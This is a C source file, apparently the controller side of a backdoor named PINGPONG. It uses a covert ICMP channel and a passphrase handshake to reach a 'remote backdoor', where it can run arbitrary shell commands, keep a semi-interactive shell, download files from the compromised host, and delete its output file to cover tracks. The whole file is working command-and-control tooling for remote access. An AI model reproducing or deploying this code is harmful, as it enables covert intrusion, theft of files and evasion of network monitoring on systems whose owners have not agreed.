#include <stdlib.h>
#include <stdio.h>
#include <string.h>
#include <stdint.h>
#include <stdbool.h> 

#include "handler.h"
#include "config.h"
#include "protocol.h"
#include "networking.h"

struct HandleContext *h_ctx;

void hexdump(void *ptr, size_t len) {
    unsigned char *buf = (unsigned char *)ptr;
    for (size_t i = 0; i < len; i++) {
        printf("%02X ", buf[i]);
        if ((i + 1) % 16 == 0)
            printf("\n");
    }
    printf("\n");
}

void simplify_path(const char *path, char *result) {
    char *token;
    char *temp_path = strdup(path);
    char **stack = (char**)malloc(strlen(path) * sizeof(char*));
    int stack_size = 0;

    token = strtok(temp_path, "/");
    while (token != NULL) {
        if (strcmp(token, "..") == 0) {
            if (stack_size > 0) {  
                free(stack[--stack_size]);
            }
        } else if (strcmp(token, ".") != 0 && strlen(token) > 0) { 
            stack[stack_size++] = strdup(token);
        }
        token = strtok(NULL, "/");
    }

    if (stack_size == 0) {
        strcpy(result, "/");
    } else {
        result[0] = '\0';
        for (int i = 0; i < stack_size; i++) {
            strcat(result, "/");
            strcat(result, stack[i]);
            free(stack[i]);
        }
    }
    free(stack);
    free(temp_path);
}

int handle_hello(struct Configuration *c) {
    int send_res;
    struct ProtocolHello *listen_res;
    struct ProtocolHello *send_pp;
    int hello_len = sizeof(struct ProtocolHello);

    send_pp = malloc(hello_len);
    listen_res = malloc(hello_len);
    
    memset(send_pp, 0, hello_len);
    strcpy(send_pp->pphdr.magic, "PIPO");
    send_pp->pphdr.id = h_ctx->current_seqid;
    send_pp->pphdr.seqid = h_ctx->current_id;
    send_pp->pphdr.payload_len = (uint16_t) hello_len - sizeof(struct ProtocolHeader);
    send_pp->pphdr.flags = (uint16_t) FLAG_HELLO;

    strcpy(send_pp->passphrase, c->password);

    send_res = send_icmp(c->src_addr, c->dst_addr, (void *)send_pp, hello_len);
    listen_icmp(1024, hello_len, c->interface, listen_res);
    if (listen_res->is_response == 0xff && (strcmp(&listen_res->passphrase, c->password) == 0 && listen_res->pphdr.id == h_ctx->current_id)){
        h_ctx->current_id++;

        free(send_pp);
        free(listen_res);
        return 0;
    }
    h_ctx->current_id++;

    free(send_pp);
    free(listen_res);
    return 1;
}
int handle_goodbye(struct Configuration *c){
    int send_res;
    struct ProtocolGoodbye *listen_res;
    struct ProtocolGoodbye *send_pp;
    int gb_len = sizeof(struct ProtocolGoodbye);
    
    send_pp = malloc(gb_len);
    listen_res = malloc(gb_len);
    
    memset(send_pp, 0, gb_len);
    strcpy(send_pp->pphdr.magic, "PIPO");

    send_pp->pphdr.id = h_ctx->current_seqid;
    send_pp->pphdr.seqid = h_ctx->current_id;
    send_pp->pphdr.payload_len = (uint16_t) gb_len - sizeof(struct ProtocolHeader);
    send_pp->pphdr.flags = (uint16_t) FLAG_GDBYE;
    send_res = send_icmp(c->src_addr, c->dst_addr, (void *)send_pp, gb_len);
    
    listen_icmp(1024, gb_len, c->interface, listen_res);
    if (listen_res->is_response == 0xff && (listen_res->pphdr.flags & FLAG_GDBYE) == FLAG_GDBYE){

        free(send_pp);
        free(listen_res);
        return 0;
    }

    free(send_pp);
    free(listen_res);
    return 1;

}

int handle_download(struct Configuration *c, char * path){
    int send_res;
    struct ProtocolHeader *listen_res;
    char * listen_res_data;
    struct ProtocolDownload *send_pp;
    int ex_len = sizeof(struct ProtocolDownload);
    
    send_pp = malloc(ex_len);
    listen_res = malloc(ex_len + MPS);
    
    listen_res_data = (char * ) listen_res + sizeof(struct ProtocolHeader);
    memset(send_pp, 0, ex_len);
    strcpy(send_pp->pphdr.magic, "PIPO");

    send_pp->pphdr.id = h_ctx->current_seqid;
    send_pp->pphdr.seqid = h_ctx->current_id;
    send_pp->pphdr.payload_len = (uint16_t) ex_len - sizeof(struct ProtocolHeader);
    send_pp->pphdr.flags = (uint16_t) FLAG_FILE_DOWNLOAD;
    strcpy(send_pp->path, path);
    send_pp->mps = MPS - sizeof(struct ProtocolHeader);

    send_res = send_icmp(c->src_addr, c->dst_addr, (void *)send_pp, ex_len);
    
    listen_icmp(1500, ex_len + MPS, c->interface, listen_res);
    if ((listen_res->flags & FLAG_FILE_DOWNLOAD) == FLAG_FILE_DOWNLOAD) {
        h_ctx->current_id++;

        fwrite(listen_res_data, sizeof(char), strlen(listen_res_data), stdout);
        if ((listen_res->flags & FLAG_END_STREAM) == FLAG_END_STREAM) {
            free(send_pp);
            free(listen_res);
            return 0;
        }
        free(send_pp);
        free(listen_res);
        return 1;
    }

    free(send_pp);
    free(listen_res);
    return -1;
}

int handle_exec(struct Configuration *c, char * cmdline, bool interactive){
    int send_res;
    struct ProtocolExec *listen_res;
    struct ProtocolExec *send_pp;
    int ex_len = sizeof(struct ProtocolExec);
    int interaction_res = 1;
    char cdcheck[256];
    char * resolved_path;
    //handle cds

    strcpy(&cdcheck, cmdline);
    cdcheck[strcspn(cdcheck, " ")] = '\0';
    if(strcmp(cdcheck, "cd") == 0) {
        resolved_path = malloc(255);
        if (strlen(&h_ctx->currentPath) != 1) {
            strcat(&h_ctx->currentPath, "/");
        }
        strcat(&h_ctx->currentPath, (char * )cdcheck+3);
        fflush(stdout);
        simplify_path(&h_ctx->currentPath, resolved_path);
        strcpy(&h_ctx->currentPath, resolved_path);  
        free(resolved_path);
        return 0;
    }
    
    send_pp = malloc(ex_len);
    listen_res = malloc(ex_len);
    
    memset(send_pp, 0, ex_len);
    strcpy(send_pp->pphdr.magic, "PIPO");

    send_pp->pphdr.id = h_ctx->current_seqid;
    send_pp->pphdr.seqid = h_ctx->current_id;
    send_pp->pphdr.payload_len = (uint16_t) ex_len - sizeof(struct ProtocolHeader);
    send_pp->pphdr.flags = (uint16_t) FLAG_EXECUTE_COMMAND;
    if (interactive){
        strcpy(send_pp->cmdline, "cd ");
        strcat(send_pp->cmdline, h_ctx->currentPath);
        strcat(send_pp->cmdline, "&& ");
    }
    strcat(send_pp->cmdline, cmdline);
    if (interactive){
        strcat(send_pp->cmdline, " &> ");
        strcat(send_pp->cmdline, OUTPUT_FILE);
    }
    send_res = send_icmp(c->src_addr, c->dst_addr, (void *)send_pp, ex_len);
    
    listen_icmp(1024, ex_len, c->interface, listen_res);
    if (listen_res->is_response == 0xff && (listen_res->pphdr.flags & FLAG_EXECUTE_COMMAND) == FLAG_EXECUTE_COMMAND){
        h_ctx->current_id++;
        
        free(send_pp);
        free(listen_res);
        if (interactive) {
            while(interaction_res) {
                interaction_res = handle_download(c, OUTPUT_FILE);
            }
        }
        return 0;
    }
    h_ctx->current_id++;

    free(send_pp);
    free(listen_res);
    return 1;
}



void print_help() {
    printf("\nshell - Semi-interactive shell. Will save output to disk: whoami (>CONFIG.OUTPUT_FILE)\n");
    printf("exec - Execute single command, does not save output to disk\n");
    printf("dowload - Download file on remote serer\n");
    printf("exit - Close session with remote backdoor\n");
    printf("help - Print this message\n\n");

}

int start_handler(struct Configuration *c) {
    int interaction_res;
    char input[10];
    char cmdline[256];
    char rm_output_file[256] = "rm ";

    strcat(rm_output_file, OUTPUT_FILE);
    h_ctx = malloc(sizeof(struct HandleContext));
    h_ctx->current_id = 0;
    h_ctx->current_seqid = 0;
    strcpy(h_ctx->currentPath, "/");

    printf("[INFO] Sending hello handshake\n");
    interaction_res = handle_hello(c);
    
    if (interaction_res == 0){
        printf("[INFO] Handshake successfully initialized\n");
    } else {
        printf("[INFO] Handshake failure\n");
        free(h_ctx);
        return 1;
    }
    printf("\n[INFO] Type 'help' for a list of commands\n\n");
    while(1){
        memset(input, 0, sizeof(input));
        memset(cmdline, 0, sizeof(cmdline));

        printf("PINGPONG > ");
        fgets(input, sizeof(input), stdin);

        if(strcmp(&input, "shell\n") == 0) {
            printf("[INFO] Entering shell, type 'exit' to go back!\n");
            while(1){
                memset(cmdline, 0, sizeof(cmdline));

                printf("PINGPONG ");
                printf(h_ctx->currentPath);
                printf("$ ");
                fgets(cmdline, sizeof(cmdline), stdin);
                cmdline[strcspn(cmdline, "\n")] = '\0';

                if (strcmp(&cmdline, "exit") == 0){
                    break;
                }
                interaction_res = handle_exec(c, &cmdline, 1);

                if (interaction_res == 0) {

                    //printf("[INFO] Command executed successfully\n");

                    interaction_res = handle_exec(c, &rm_output_file, 0);
                    if (interaction_res == 0) {
                        //printf("[INFO] Cleanup Successfull\n");
                    } else {
                        printf("[INFO] Cleanup Failed\n");
                    }
                } else {
                    printf("[INFO] Command failed\n");
                }
            }
            continue;
        }
        if(strcmp(&input, "exec\n") == 0) {
            
            printf("PINGPONG cmdline > ");
            fgets(cmdline, sizeof(cmdline), stdin);
            cmdline[strcspn(cmdline, "\n")] = '\0';

            interaction_res = handle_exec(c, &cmdline, 0);

            if (interaction_res == 0) {
                printf("[INFO] Command executed successfully\n");
            } else {
                printf("[INFO] Command failed\n");
            }
            continue;
        }
        if(strcmp(&input, "download\n") == 0) {
            
            printf("PINGPONG path > ");
            fgets(cmdline, sizeof(cmdline), stdin);
            cmdline[strcspn(cmdline, "\n")] = '\0';
            interaction_res = 1;
            while(interaction_res) {
                interaction_res = handle_download(c, &cmdline);
            }
            if (interaction_res == 0) {
                printf("[INFO] Download Completed\n");
            } else {
                printf("[INFO] Download failed\n");
            }
            continue;
        }

        if(strcmp(&input, "exit\n") == 0) {
            interaction_res = handle_goodbye(c);
            if (interaction_res == 0) {
                printf("[INFO] Successfully closed session\n");
                free(h_ctx);
                return 0;
            } else {
                printf("[INFO] Session closure failure\n");
            }
        } 
        print_help();
    }
    
    free(h_ctx);
    return 0;
}